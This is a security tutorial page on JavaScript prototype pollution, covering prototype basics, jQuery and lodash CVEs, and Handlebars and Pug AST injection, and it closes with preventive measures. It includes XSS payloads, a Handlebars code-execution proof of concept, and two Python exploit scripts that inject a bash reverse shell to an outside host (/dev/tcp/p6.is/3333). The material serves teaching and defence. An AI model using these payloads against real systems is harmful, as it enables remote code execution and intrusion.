---
layout: page
title: NodeJS - __proto__ & prototype Pollution
category: nodejs
toc:
  sidebar: left
---

## Objects in JavaScript <a href="#id-053a" id="id-053a"></a>

Objects in JavaScript are essentially collections of key-value pairs, known as properties. An object can be created using `Object.create` with `null` as an argument to produce an empty object. This method allows the creation of an object without any inherited properties.

```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```

An empty object is akin to an empty dictionary, represented as `{}`.

<br>

### Functions and Classes in JavaScript

In JavaScript, classes and functions are closely linked, with functions often serving as constructors for classes. Despite JavaScript's lack of native class support, constructors can emulate class behavior.

```javascript
// Run this in the developers tools console

function Employee(name, position) {
  this.name = name;
  this.position = position;
  this.introduce = function () {
    return "My name is " + this.name + " and I work as a " + this.position + ".";
  };
}

Employee.prototype;

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__;
```

<br>

### Prototypes in JavaScript

JavaScript allows the modification, addition, or deletion of prototype attributes at runtime. This flexibility enables the dynamic extension of class functionalities.

Functions like `toString` and `valueOf` can be altered to change their behavior, demonstrating the adaptable nature of JavaScript's prototype system.

## Inheritance

In prototype-based programming, properties/methods are inherited by objects from classes. These classes are created by adding properties/methods either to an instance of another class or to an empty object.

It should be noted that when a property is added to an object serving as the prototype for other objects (such as `myPersonObj`), the inheriting objects gain access to this new property. However, this property is not automatically displayed unless it is explicitly invoked.

## \_\_proto\_\_ pollution <a href="#id-0d0a" id="id-0d0a"></a>

## Exploring Prototype Pollution in JavaScript

JavaScript objects are defined by key-value pairs and inherit from the JavaScript Object prototype. This means altering the Object prototype can influence all objects in the environment.

Let's use a different example to illustrate:

```javascript
function Vehicle(model) {
  this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```

Access to the Object prototype is possible through:

```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```

By adding properties to the Object prototype, every JavaScript object will inherit these new properties:

```javascript
function Vehicle(model) {
  this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function () {
  console.log("Beep beep!");
};
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```

## prototype pollution

For a scenario where `__proto__` usage is restricted, modifying a function's prototype is an alternative:

```javascript
function Vehicle(model) {
  this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function () {
  console.log("Beep beep!");
};
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function () {
  console.log("Honk!");
};
car1.constructor.prototype.isElectric = true;
```

This affects only objects created from the `Vehicle` constructor, giving them the `beep`, `hasWheels`, `honk`, and `isElectric` properties.

Two methods to globally affect JavaScript objects through prototype pollution include:

1. Polluting the `Object.prototype` directly:

```javascript
Object.prototype.goodbye = function () {
  console.log("Goodbye!");
};
```

2. Polluting the prototype of a constructor for a commonly used structure:

```javascript
var example = { key: "value" };
example.constructor.prototype.greet = function () {
  console.log("Hello!");
};
```

After these operations, every JavaScript object can execute `goodbye` and `greet` methods.

## Polluting other objects

<br>

### From a class to Object.prototype

In an scenario where you can **pollute an specific object** and you need to **get to `Object.prototype`** you can search for it with something like the following code:

```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for (let key of Object.getOwnPropertyNames(window)) {
  if (window[key]?.constructor.prototype === Object.prototype) {
    console.log(key);
  }
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for (let key1 in document.querySelector("a")) {
  for (let key2 in document.querySelector("a")[key1]) {
    if (document.querySelector("a")[key1][key2] === window) {
      console.log(key1 + "." + key2);
    }
  }
}
```

<br>

### Array elements pollution

Note that as you can pollute attributes of objects in JS, if you have access to pollute an array you can also **pollute values of the array** accessible **by indexes** (note that you cannot overwrite values, so you need to pollute indexes that are somehow used but not written).

```javascript
c = [1, 2];
a = [];
a.constructor.prototype[1] = "yolo";
b = [];
b[0]; //undefined
b[1]; //"yolo"
c[1]; // 2 -- not
```

<br>

### Html elements pollution

When generating a HTML element via JS it's possible to **overwrite** the **`innerHTML`** attribute to make it write **arbitrary HTML code.** [Idea and example from this writeup](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```

## Examples

<br>

### Basic Example

A prototype pollution occurs due to a flaw in the application that allows overwriting properties on `Object.prototype`. This means that since most objects derive their properties from `Object.prototype`

The easies example is to add a value to an **undefiner attribute of an object** that is going to be checked, like:

```javascript
if (user.admin) {
```

If the attribute **`admin` is undefined** it's possible to abuse a PP and set it to True with something like:

```javascript
Object.prototype.isAdmin = true;
let user = {};
user.isAdmin; // true
```

The mechanism behind this involves manipulating properties such that if an attacker has control over certain inputs, they can modify the prototype of all objects in the application. This manipulation typically involves setting the `__proto__` property, which, in JavaScript, is synonymous with directly modifying an object's prototype.

The conditions under which this attack can be successfully executed, as outlined in a specific [study](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf), include:

- Performing a recursive merge.
- Defining properties based on a path.
- Cloning objects.

<br>

### Override function

```python
customer.__proto__.toString = ()=>{alert("polluted")}
```

<br>

### Proto Pollution to RCE

Other payloads:

- [https://github.com/KTH-LangSec/server-side-prototype-pollution](https://github.com/KTH-LangSec/server-side-prototype-pollution)

## Client-side prototype pollution to XSS

<br>

### CVE-2019–11358: Prototype pollution attack through jQuery $ .extend

[For further details check this article](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7) In jQuery, the `$ .extend` function can lead to prototype pollution if the deep copy feature is utilized improperly. This function is commonly used for cloning objects or merging properties from a default object. However, when misconfigured, properties intended for a new object can be assigned to the prototype instead. For instance:

```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```

This vulnerability, identified as CVE-2019–11358, illustrates how a deep copy can inadvertently modify the prototype, leading to potential security risks, such as unauthorized admin access if properties like `isAdmin` are checked without proper existence verification.

<br>

### CVE-2018–3721, CVE-2019–10744: Prototype pollution attack through lodash

[For further details check this article](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

[Lodash](https://www.npmjs.com/package/lodash) encountered similar prototype pollution vulnerabilities (CVE-2018–3721, CVE-2019–10744). These issues were addressed in version 4.17.11.

<br>

### Another tutorial with CVEs

<br>

### Tools to detect Prototype Pollution

- [**Server-Side-Prototype-Pollution-Gadgets-Scanner**](https://github.com/doyensec/Server-Side-Prototype-Pollution-Gadgets-Scanner): Burp Suite extension designed to detect and analyze server-side prototype pollution vulnerabilities in web applications. This tool automates the process of scanning requests to identify potential prototype pollution issues. It exploits known gadgets - methods of leveraging prototype pollution to execute harmful actions - particularly focusing on Node.js libraries.
- [**server-side-prototype-pollution**](https://github.com/portswigger/server-side-prototype-pollution): This extension identifies server side prototype pollution vulnerabilities. It uses techniques described in the [server side prototype pollution](https://portswigger.net/research/server-side-prototype-pollution).

<br>

### AST Prototype Pollution in NodeJS

NodeJS extensively utilizes Abstract Syntax Trees (AST) in JavaScript for functionalities like template engines and TypeScript. This section explores the vulnerabilities related to prototype pollution in template engines, specifically Handlebars and Pug.

<br>

### Handlebars Vulnerability Analysis

The Handlebars template engine is susceptible to a prototype pollution attack. This vulnerability arises from specific functions within the `javascript-compiler.js` file. The `appendContent` function, for instance, concatenates `pendingContent` if it's present, while the `pushSource` function resets `pendingContent` to `undefined` after adding the source.

**Exploitation Process**

The exploitation leverages the AST (Abstract Syntax Tree) produced by Handlebars, following these steps:

1. **Manipulation of the Parser**: Initially, the parser, via the `NumberLiteral` node, enforces that values are numeric. Prototype pollution can circumvent this, enabling the insertion of non-numeric strings.
2. **Handling by the Compiler**: The compiler can process an AST Object or a string template. If `input.type` equals `Program`, the input is treated as pre-parsed, which can be exploited.
3. **Injection of Code**: Through manipulation of `Object.prototype`, one can inject arbitrary code into the template function, which may lead to remote code execution.

An example demonstrating the exploitation of the Handlebars vulnerability:

```javascript
const Handlebars = require("handlebars");

Object.prototype.type = "Program";
Object.prototype.body = [
  {
    type: "MustacheStatement",
    path: 0,
    params: [
      {
        type: "NumberLiteral",
        value: "console.log(process.mainModule.require('child_process').execSync('id').toString())",
      },
    ],
    loc: {
      start: 0,
      end: 0,
    },
  },
];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval("(" + template + ")")["main"].toString());
```

This code showcases how an attacker could inject arbitrary code into a Handlebars template.

**External Reference**: An issue related to prototype pollution was found in the 'flat' library, as detailed here: [Issue on GitHub](https://github.com/hughsk/flat/issues/105).

**External Reference**: [Issue related to prototype pollution in the 'flat' library](https://github.com/hughsk/flat/issues/105)

Example of prototype pollution exploit in Python:

```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
})

# execute
requests.get(TARGET_URL)
```

<br>

### Pug Vulnerability

Pug, another template engine, faces a similar risk of prototype pollution. Detailed information is available in the discussion on [AST Injection in Pug](https://blog.p6.is/AST-Injection/#Pug).

Example of prototype pollution in Pug:

```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
    "__proto__.block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
    }
})

# execute
requests.get(TARGET_URL)
```

<br>

### Preventive Measures

To reduce the risk of prototype pollution, the strategies listed below can be employed:

1. **Object Immutability**: The `Object.prototype` can be made immutable by applying `Object.freeze`.
2. **Input Validation**: JSON inputs should be rigorously validated against the application's schema.
3. **Safe Merge Functions**: The unsafe use of recursive merge functions should be avoided.
4. **Prototype-less Objects**: Objects without prototype properties can be created using `Object.create(null)`.
5. **Use of Map**: Instead of `Object`, `Map` should be used for storing key-value pairs.
6. **Library Updates**: Security patches can be incorporated by regularly updating libraries.
7. **Linter and Static Analysis Tools**: Use tools like ESLint with appropriate plugins to detect and prevent prototype pollution vulnerabilities.
8. **Code Reviews**: Implement thorough code reviews to identify and remediate potential risks related to prototype pollution.
9. **Security Training**: Educate developers about the risks of prototype pollution and best practices for writing secure code.
10. **Using Libraries with Caution**: Be cautious while using third-party libraries. Assess their security posture and review their code, especially those manipulating objects.
11. **Runtime Protection**: Employ runtime protection mechanisms such as using security-focused npm packages which can detect and prevent prototype pollution attacks.

## References

- [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
- [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
- [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
- [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)
